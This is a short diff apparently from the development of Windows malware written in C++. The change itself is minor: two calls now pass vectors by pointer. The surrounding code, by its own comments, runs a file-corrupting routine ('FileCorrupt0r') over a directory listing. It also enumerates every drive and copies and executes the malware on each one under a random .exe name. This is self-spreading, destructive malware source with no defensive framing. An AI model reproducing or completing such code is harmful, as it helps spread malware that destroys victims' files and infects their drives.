@@ -86,7 +86,7 @@ INT APIENTRY wWinMain(
 		//// BETA ////
 		// DirectoryIterat0r 1.0 //
 		std::vector<std::wstring> vszDir, vszFile;
-		if (fnDirectoryIteratorW(szCd, L"*", vszDir, vszFile)) {
+		if (fnDirectoryIteratorW(szCd, L"*", &vszDir, &vszFile)) {
 			// FileCorrupt0r 1.0 //
 			LARGE_INTEGER liFs;
 			DWORD dwNOBW;
@@ -247,7 +247,7 @@ INT APIENTRY wWinMain(
 			// Enumerate Drives
 			std::vector<std::wstring> vszDrives;
 			std::wstring szNfn;
-			if (fnDriveEnumeratorW(vszDrives)) {
+			if (fnDriveEnumeratorW(&vszDrives)) {
 				// Copy & Execute Malware in all enumerated Drives
 				for (std::wstring i : vszDrives) {
 					szNfn = i + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
